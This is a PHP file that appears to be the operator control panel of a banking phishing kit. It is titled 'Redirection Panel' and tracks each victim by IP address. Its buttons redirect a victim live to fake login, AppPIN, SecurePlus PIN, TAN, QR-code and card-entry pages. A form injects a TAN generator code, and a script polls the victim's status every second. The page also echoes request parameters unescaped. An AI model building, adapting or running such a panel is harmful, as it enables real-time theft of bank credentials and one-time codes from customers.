<?php 
require 'panel.class.php';
$pnl = new Panel();

if(isset($_GET['page'], $_GET['ip'])){
    $pnl->editVicFIle($_GET['page'], $_GET['ip']);
    header("location: ctr.php?ip=".$_GET['ip']."&redirected");
}

 
if(isset($_POST['reader'])){
    $cc = $_POST['reader'];
    $ip = $_POST['ip'];
    $pnl->updateD($ip, $cc);
    header("location: ctr.php?ip=".$_POST['ip']."&updated");
}

?>
<!doctype html>
<html>
<head>
<title>Redirection Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/style.css">
</head>
<body>

<div class="btns">
<?php 


if(isset($_GET['redirected'])){
    echo "<h1>Redirected!</h1>";
}

if(isset($_GET['uploaded'])){
    echo "<h1>FILE UPLOADED!</h1>";
}
 
if(isset($_GET['updated'])){
    echo "<h1>DATA UPDATED!</h1>";
}
 

?>

<form>
    <span>[<?php echo @$_GET['ip'];?>] </span>
    <span>[<span id="statu">loading...</span>]</span>
</form>
    
<form action="ctr.php" method="get">
<h3 style="color:white;">Control options</h3>
    <input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
    <button type="submit" name="page" value="login.php">LOGIN</button>
    <button type="submit" name="page" value="apppin.php">AppPIN</button>
    <button type="submit" name="page" value="info.php">INFO</button>
    <button type="submit" name="page" value="secure.php">SecurePlus PIN</button>
    <button type="submit" name="page" value="tan.php">TAN</button>
    <button type="submit" name="page" value="qr.php">QR</button>
    <button type="submit" name="page" value="card.php">CARD</button>
    <button type="submit" name="page" value="error-handler.php" class="error">ERROR</button>
    <button type="submit" name="page" value="exit.php">EXIT</button>
</form>
 
<form action="ctr.php" method="post" enctype="multipart/form-data" >
<h3 style="color:white;">Add TAN GEN CODE</h3>
<input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
<input type="text" required placeholder="TAN GEN CODE" value="<?php echo @$pnl->getD(@$_GET['ip']); ?>" name="reader"><br>
<button type="submit">ADD</button>
</form>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
 
    setInterval(() => {
        $.post("get_statu.php",{get:1, ip:'<?php echo @$_GET['ip']?>'},(res)=>{
            $("#statu").html(res);
        });
    }, 1000);
</script>

</body>
</html>